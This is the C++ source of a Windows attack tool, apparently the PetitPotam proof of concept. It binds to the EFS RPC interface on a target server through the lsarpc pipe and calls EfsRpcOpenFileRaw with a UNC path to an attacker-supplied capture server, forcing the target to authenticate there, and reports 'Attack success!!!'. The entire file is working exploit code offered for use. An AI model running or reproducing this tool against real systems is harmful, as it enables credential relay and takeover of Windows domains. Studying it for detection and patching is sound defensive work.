// PetitPotam.cpp : Ce fichier contient la fonction 'main'. L'exécution du programme commence et se termine à cet endroit.
// Author: GILLES Lionel aka topotam (@topotam77)

#include <stdio.h>
#include <tchar.h>
#include <assert.h>
#include <SDKDDKVer.h>
#include <Windows.h>
#include "ms-efsrpc_h.h"



const RPC_WSTR MS_EFSR_UUID = (RPC_WSTR)L"c681d488-d850-11d0-8c52-00c04fd90f7e";
const RPC_WSTR InterfaceAddress = (RPC_WSTR)L"\\pipe\\lsarpc";

//Returns the last Win32 error, in string format. Returns an empty string if there is no error.
void PrintWin32Error(DWORD dwError)
{
	LPWSTR messageBuffer = nullptr;
	size_t size = FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPWSTR)&messageBuffer, 0, NULL);

	wprintf(L"Error Code %d - %s\n", dwError, messageBuffer);
	//Free the buffer.
	LocalFree(messageBuffer);
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}

handle_t Bind(wchar_t* target)
{
	RPC_STATUS RpcStatus;
	wchar_t buffer[100];
	swprintf(buffer, 100, L"\\\\%s", target);
	RPC_WSTR StringBinding;
	handle_t BindingHandle;
	RpcStatus = RpcStringBindingComposeW(
		MS_EFSR_UUID,
		(RPC_WSTR)L"ncacn_np",
		(RPC_WSTR)buffer,
		InterfaceAddress,
		NULL,
		&StringBinding);

	if (RpcStatus != RPC_S_OK) {
		wprintf(L"Error in RpcStringBindingComposeW\n");
		return(0);
	}

	RpcStatus = RpcBindingFromStringBindingW(StringBinding, &BindingHandle);
	if (RpcStatus != RPC_S_OK) {
		wprintf(L"Error in RpcBindingFromStringBindingW\n");
		return(0);
	}
	
	RpcStringFreeW(&StringBinding);

	if (RpcStatus != RPC_S_OK) {
		wprintf(L"Error in RpcStringFreeW\n");
		return(0);
	}

	return(BindingHandle);
}


int wmain(int argc, wchar_t** argv, wchar_t** envp)
{
	wprintf(L"Usage: PetitPotam.exe <captureServerIP> <targetServerIP> \n");
	handle_t ht = Bind(argv[2]);
	HRESULT hr = NULL;
	PEXIMPORT_CONTEXT_HANDLE plop;
	SecureZeroMemory((char*)&(plop), sizeof(plop));
	wchar_t buffer[100];
	swprintf(buffer, 100, L"\\\\%s\\test\\topotam.exe", argv[1]);
	 
	long flag = 0;

	hr = EfsRpcOpenFileRaw(ht, &plop, buffer, flag);

	if (hr == ERROR_BAD_NETPATH) {
		wprintf(L"Attack success!!!\n");
	}
				
	return 0;
}
